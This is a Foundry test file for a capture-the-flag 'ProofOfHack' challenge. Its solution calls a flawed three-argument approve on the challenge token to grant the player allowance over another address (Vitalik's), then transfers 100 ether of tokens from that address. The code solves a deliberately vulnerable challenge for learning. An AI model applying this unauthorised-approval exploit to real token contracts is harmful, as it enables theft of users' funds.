// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/arbitrum/ProofOfHack.sol";
import "../src/testnet/ChallengeFactory.sol";
import "../src/testnet/challenges/IChallengeFactory.sol";

import {FactoryChallenge0} from "../src/testnet/challenges/Challenge0.factory.sol";


contract ProofOfHackTest is Test {
    ProofOfHack public proofOfHack;
    ChallengeFactory public factory;

    address minter;

    function setUp() public {
        // minter = 0x030f6a4c5baa7350405fa8122cf458070abd1b59
        minter = makeAddr("minter");
        proofOfHack = new ProofOfHack(minter);
        
        factory = new ChallengeFactory();
    }

    function testHack() public {
        address challenge0 = address(new FactoryChallenge0());

        address player = makeAddr("player");
        vm.startPrank(player);
        assertEq(factory.getChallengesInstances(player, challenge0).length, 0);
        factory.deployChallenge(challenge0);
        assertEq(factory.getChallengesInstances(player, challenge0).length, 1);

        assertFalse(factory.checkChallenge(player, challenge0));

        address vtoken = factory.getChallengesInstances(player, challenge0)[0];
        
        address vitalik = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;

        // HACK
        vtoken.call(abi.encodeWithSignature("approve(address,address,uint256)", vitalik, player, type(uint256).max));
        vtoken.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", vitalik, player, 100 ether));
        
        assertTrue(factory.checkChallenge(player, challenge0));

        vm.stopPrank();
    }

}
